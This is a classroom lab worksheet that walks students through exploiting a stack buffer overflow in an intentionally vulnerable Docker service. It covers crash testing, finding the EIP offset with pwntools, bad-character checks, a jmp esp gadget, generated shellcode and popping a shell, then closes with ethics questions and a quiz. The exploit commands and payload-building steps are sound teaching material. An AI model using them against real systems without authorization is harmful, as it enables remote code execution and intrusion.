# Week 10: Exploit Development — Buffer Overflows

---

## **Before We Start (5 minutes)**

### **Important Rules**
✅ **DO:** Only attack the lab target (`172.25.0.10`) inside Docker
✅ **DO:** Ask for help the moment gdb or pwntools confuses you
✅ **DO:** Write down every offset and address you find — you will reuse them
❌ **DON'T:** Run any of this against a real or production network
❌ **DON'T:** Share a working exploit for a real service outside this lab
❌ **DON'T:** Skip the bad-character step — it is why "almost working" payloads fail

### **What you need to know first**
- The server stores your password in a **64-byte buffer on the stack**.
- A function's **return address** sits right above that buffer.
- Overflow the buffer → overwrite the return address → **you choose what runs next**.

### **Quick Setup**
```bash
# 1. Build the base image once (from the repo root)
make build-base

# 2. Start the lab
cd labs/week10 && docker compose up -d

# 3. Enter the attacker container
docker exec -it week10-attacker bash

# 4. Check the target is up
nc -zv 172.25.0.10 4444
```
**Check:** Did `nc` say "open"?  ✓ Yes  ✓ No

---

## **Results Table — fill this in as you go**

| # | Finding | Your value |
|---|---------|-----------|
| 1 | Input length that first crashes the server | __________ bytes |
| 2 | Exact byte **offset** to EIP (from `cyclic_find`) | __________ |
| 3 | EIP value when you send `BBBB` (should be `0x42424242`) | `0x__________` |
| 4 | Bad characters found (hex) | `\x00 \x0a __________` |
| 5 | Address of the `jmp esp` gadget | `0x__________` |
| 6 | Final payload size (offset + EIP + shellcode) | __________ bytes |
| 7 | `id` output from the popped shell | `uid=__________` |

---

## **Part 1: See the Crash (10 minutes)**

A buffer overflow means we wrote **past the end** of the buffer. Let's prove it.

```bash
# Send way more than 64 bytes
python3 -c "print('A'*1000)" | nc 172.25.0.10 4444
```
```bash
# Watch the target logs (from the host, in another terminal)
docker logs --tail 30 week10-target
```

**What did you see in the logs?** _________________________________

**Circle one:** the server  •  crashed  •  handled it fine

**Try smaller sizes.** What is the **shortest** input that still crashes it?
```bash
python3 -c "print('A'*100)"   | nc 172.25.0.10 4444
python3 -c "print('A'*70)"    | nc 172.25.0.10 4444
```
**Record crash length:** __________ bytes

---

## **Part 2: Find the Offset (20 minutes)**

We don't want to guess where EIP is. A **cyclic pattern** puts a unique value at
every 4 bytes, so whichever 4 bytes land in EIP tell us the exact offset.

Attach gdb **inside the target** (it has the matching 32-bit binary):
```bash
docker exec -it week10-target bash
gdb -q -p "$(pgrep -x vuln)"
```
Resume the server:
```gdb
(gdb) c
```
From the **attacker**, send the pattern as the password:
```bash
python3 -c "from pwn import *; context(arch='i386'); p=remote('172.25.0.10',4444); p.recvuntil(b'Username:'); p.sendline(b'x'); p.recvuntil(b'Password:'); p.sendline(cyclic(200)); import time; time.sleep(1)"
```
Back in gdb, read EIP:
```gdb
(gdb) info registers eip
```
**Write the EIP value:** `0x__________`

Convert it to an offset (on the attacker):
```bash
python3 -c "from pwn import *; print(cyclic_find(0x6161616a))"
```
*(replace `0x6161616a` with your own EIP value)*

**Exact offset to EIP:** __________ bytes

Quit gdb so the server restarts:
```gdb
(gdb) quit
```

---

## **Part 3: Confirm EIP Control (10 minutes)**

Prove **you** decide what EIP becomes. Put `BBBB` exactly where EIP is read.

Set `OFFSET` to the number from Part 2, then from the attacker:
```bash
# example if OFFSET is 76:
python3 -c "from pwn import *; p=remote('172.25.0.10',4444); p.recvuntil(b'Username:'); p.sendline(b'x'); p.recvuntil(b'Password:'); p.sendline(b'A'*76 + b'BBBB'); import time; time.sleep(1)"
```
Attach gdb again (`docker exec -it week10-target bash` → `gdb -q -p "$(pgrep -x vuln)"` → `c`) **before** sending, then check:
```gdb
(gdb) info registers eip
```

**Circle one:** EIP = `0x42424242`  ✓ Yes (I control it!)  ✓ No (re-check the offset)

---

## **Part 4: Bad Characters (20 minutes)**

Some bytes break a payload. `strcpy()` stops at **`\x00`**; the read loop stops
at **`\x0a`**. So those two are **always bad here**. Test the rest.

From the attacker (set `OFFSET`):
```bash
python3 -c "
from pwn import *
context(arch='i386')
p=remote('172.25.0.10',4444)
p.recvuntil(b'Username:'); p.sendline(b'x')
p.recvuntil(b'Password:')
p.sendline(b'A'*76 + bytes(range(1,256)))
import time; time.sleep(1)
"
```
In gdb, dump memory where the payload landed:
```gdb
(gdb) x/256xb $esp-256
```
Compare what you see against `1,2,3,...,255`. Any byte that is **missing,
changed, or that cuts off the rest** is bad.

**Bad characters found:** `\x00  \x0a  ______________________________`

---

## **Part 5: Choose Your Technique (20 minutes)**

NX is **OFF**, so we run shellcode straight off the stack using a **`jmp esp`**
gadget (ESP points at our shellcode right after the return address).

Copy the binary into the shared mount (from the **host**):
```bash
docker cp week10-target:/vuln labs/week10/exploits/vuln
```
Find the gadget (in the attacker):
```bash
ROPgadget --binary /exploits/vuln | grep ': jmp esp'
```
**`jmp esp` address:** `0x__________`

Check the default shellcode has no bad chars:
```bash
python3 -c "from pwn import *; context(arch='i386'); sc=asm(shellcraft.i386.linux.sh()); print('bad?', [hex(b) for b in sc if b in (0,0x0a,0x0d)])"
```
**Circle one:** shellcode is clean (no bad chars)  ✓ Yes  ✓ No → pick/encode another

**Bonus (ret2win):** find the secret-menu function and skip shellcode entirely:
```bash
objdump -d /exploits/vuln | grep -A2 '<secret_menu>'
```
**`secret_menu` address:** `0x__________`

---

## **Part 6: Pop a Shell (15 minutes)**

Edit the skeleton with your real values:
```bash
nano /exploits/skeleton.py
# set: OFFSET, JMP_ESP, BADCHARS
```
Run it:
```bash
cd /exploits && python3 skeleton.py
```
When you get a shell, type:
```bash
id
```
**`id` output:** _________________________________

**Final payload size:** __________ bytes

**Check the boxes when done:**
- [ ] I crashed the server on purpose
- [ ] I found the exact EIP offset
- [ ] I confirmed EIP = `0x42424242`
- [ ] I found my bad characters
- [ ] I got a shell and ran `id`

---

## **Part 7: Ethics (10 minutes)**

This skill — finding a memory-corruption bug and turning it into code execution
— is powerful. Mark each scenario **OK** or **NOT OK**:

| Scenario | OK? |
|----------|-----|
| Exploiting this isolated lab container | |
| Reporting a buffer overflow you found in a bug-bounty program | |
| Running this exploit against your organization's login portal "to check" | |
| Using this to win a CTF challenge | |
| Selling a working exploit for a real product to strangers online | |
| Re-testing a client's app **after** the engagement contract ended | |

**A company hires you to pentest their app.** When is it legal to run an
exploit like this? (Circle all that apply)
- A) Whenever you find a bug
- B) Only after **written authorization** defines the scope
- C) Only against the in-scope systems, during the agreed window
- D) Never — just report the bug theoretically

**Why does written scope matter for memory-corruption bugs specifically?**
_________________________________

---

## **Quick Quiz (5 minutes)**

1. **Why does `strcpy()` cause a buffer overflow?**
   - A) It is slow
   - B) It copies until it finds a NUL byte, with no length check
   - C) It uses the heap
   - D) It encrypts the data

2. **The saved return address (EIP) lives…**
   - A) On the heap
   - B) Just above the local buffer, on the stack
   - C) In a register only
   - D) In the binary file

3. **A cyclic (De Bruijn) pattern is used to…**
   - A) Encrypt the payload
   - B) Find the exact offset to EIP
   - C) Bypass the firewall
   - D) Find bad characters

4. **`\x00` is a bad character here because…**
   - A) It is invisible
   - B) `strcpy()` stops copying at a NUL byte
   - C) The CPU rejects it
   - D) It crashes nc

5. **If NX (DEP) were ON, you could NOT…**
   - A) Send any payload
   - B) Execute shellcode placed on the stack
   - C) Use gdb
   - D) Overflow the buffer

6. **A `jmp esp` gadget lets you…**
   - A) Encrypt shellcode
   - B) Redirect EIP to shellcode sitting right after the return address
   - C) Disable ASLR
   - D) Read memory

7. **True/False: With all protections ON, buffer overflows are impossible.**
   - True / False *(they are harder, not impossible)*

